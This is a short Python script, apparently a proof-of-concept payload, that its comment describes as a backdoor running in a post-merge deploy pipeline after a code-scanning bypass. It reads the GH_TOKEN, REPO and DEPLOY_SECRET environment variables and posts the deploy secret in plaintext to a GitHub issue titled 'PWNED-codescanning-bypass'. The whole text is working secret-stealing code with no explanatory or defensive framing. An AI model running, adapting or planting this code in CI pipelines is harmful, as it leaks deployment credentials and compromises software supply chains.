import os, json, urllib.request

# Backdoor payload: executes in the post-merge deploy pipeline (RCE), reads the
# deploy secret + write-scoped token, and exfiltrates via a GitHub issue.
tok = os.environ.get("GH_TOKEN", "")
repo = os.environ.get("REPO", "")
sec = os.environ.get("DEPLOY_SECRET", "NONE")

body = (
    "RCE in post-merge deploy via Mergify code_scanning bypass | "
    "DEPLOY_SECRET=" + sec + " (len " + str(len(sec)) + ") | "
    "write_token_present=" + str(bool(tok))
)
req = urllib.request.Request(
    "https://api.github.com/repos/" + repo + "/issues",
    method="POST",
    headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json"},
    data=json.dumps({"title": "PWNED-codescanning-bypass", "body": body}).encode(),
)
print("ISSUE_CREATED", urllib.request.urlopen(req).status)
